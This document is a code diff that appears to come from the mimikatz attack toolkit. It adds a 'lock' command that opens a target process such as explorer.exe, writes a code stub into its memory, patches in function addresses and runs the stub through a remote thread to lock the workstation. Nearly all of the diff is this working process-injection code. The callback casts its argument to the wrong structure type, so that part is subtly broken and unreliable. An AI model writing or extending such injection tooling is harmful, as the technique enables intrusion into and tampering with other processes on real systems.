@@ -19,10 +19,11 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_memssp,	L"memssp",		NULL},
 	{kuhl_m_misc_skeleton,	L"skeleton",	NULL},
 	{kuhl_m_misc_compressme,L"compressme",	NULL},
-	{kuhl_m_misc_wp,		L"wp",	NULL},
-	{kuhl_m_misc_mflt,		L"mflt",	NULL},
+	{kuhl_m_misc_lock,		L"lock",		NULL},
+	{kuhl_m_misc_wp,		L"wp",			NULL},
+	{kuhl_m_misc_mflt,		L"mflt",		NULL},
 	{kuhl_m_misc_easyntlmchall,	L"easyntlmchall", NULL},
-	{kuhl_m_misc_clip,		L"clip", NULL},
+	{kuhl_m_misc_clip,		L"clip",		 NULL},
 };
 const KUHL_M kuhl_m_misc = {
 	L"misc",	L"Miscellaneous module",	NULL,
@@ -764,6 +765,81 @@ NTSTATUS kuhl_m_misc_compressme(int argc, wchar_t * argv[])
 		LocalFree(data);
 	}
 	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_misc_lock(int argc, wchar_t * argv[])
+{
+	PCWCHAR process;
+	UNICODE_STRING uProcess;
+	kull_m_string_args_byName(argc, argv, L"process", &process, L"explorer.exe");
+		RtlInitUnicodeString(&uProcess, process);
+		kprintf(L"Proxy process : %wZ\n", &uProcess);
+		kull_m_process_getProcessInformation(kuhl_m_misc_lock_callback, &uProcess);
+	return STATUS_SUCCESS;
+}
+
+BOOL CALLBACK kuhl_m_misc_lock_callback(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
+{
+	DWORD pid;
+	if(RtlEqualUnicodeString(&pSystemProcessInformation->ImageName, &((PKIWI_WP_DATA) pvArg)->process, TRUE))
+	{
+		pid = PtrToUlong(pSystemProcessInformation->UniqueProcessId);
+		kprintf(L"> Found %wZ with PID %u : ", &pSystemProcessInformation->ImageName, pid);
+		kuhl_m_misc_lock_for_pid(pid, ((PKIWI_WP_DATA) pvArg)->wp);
+	}
+	return TRUE;
+}
+
+#pragma optimize("", off)
+DWORD WINAPI kuhl_m_misc_lock_thread(PREMOTE_LIB_DATA lpParameter)
+{
+	lpParameter->output.outputStatus = STATUS_SUCCESS;
+	if(!((PLOCKWORKSTATION) 0x4141414141414141)())
+		lpParameter->output.outputStatus = ((PGETLASTERROR) 0x4242424242424242)();
+	return STATUS_SUCCESS;
+}
+DWORD kuhl_m_misc_lock_thread_end(){return 'stlo';}
+#pragma optimize("", on)
+
+void kuhl_m_misc_lock_for_pid(DWORD pid, PCWCHAR wp)
+{
+	REMOTE_EXT extensions[] = {
+		{L"user32.dll",		"LockWorkStation",	(PVOID) 0x4141414141414141, NULL},
+		{L"kernel32.dll",	"GetLastError",		(PVOID) 0x4242424242424242, NULL},
+	};
+	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
+	HANDLE hProcess;
+	PKULL_M_MEMORY_HANDLE hMemory = NULL;
+	KULL_M_MEMORY_ADDRESS aRemoteFunc;
+	PREMOTE_LIB_INPUT_DATA iData;
+	REMOTE_LIB_OUTPUT_DATA oData;
+	
+	if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, pid))
+	{
+		if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemory))
+		{
+			if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(hMemory, kuhl_m_misc_lock_thread, (DWORD) ((PBYTE) kuhl_m_misc_lock_thread_end - (PBYTE) kuhl_m_misc_lock_thread), &extForCb, &aRemoteFunc))
+			{
+				if(iData = kull_m_remotelib_CreateInput(NULL, 0, 0, NULL))
+				{
+					if(kull_m_remotelib_create(&aRemoteFunc, iData, &oData))
+					{
+						if(oData.outputStatus)
+							kprintf(L"error %u\n", oData.outputStatus);
+						else
+							kprintf(L"OK!\n");
+					}
+					else PRINT_ERROR_AUTO(L"kull_m_remotelib_create");
+					LocalFree(iData);
+				}
+				kull_m_memory_free(&aRemoteFunc);
+			}
+			else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
+			kull_m_memory_close(hMemory);
+		}
+		CloseHandle(hProcess);
+	}
+	else PRINT_ERROR_AUTO(L"OpenProcess");
 }
 
 NTSTATUS kuhl_m_misc_wp(int argc, wchar_t * argv[])
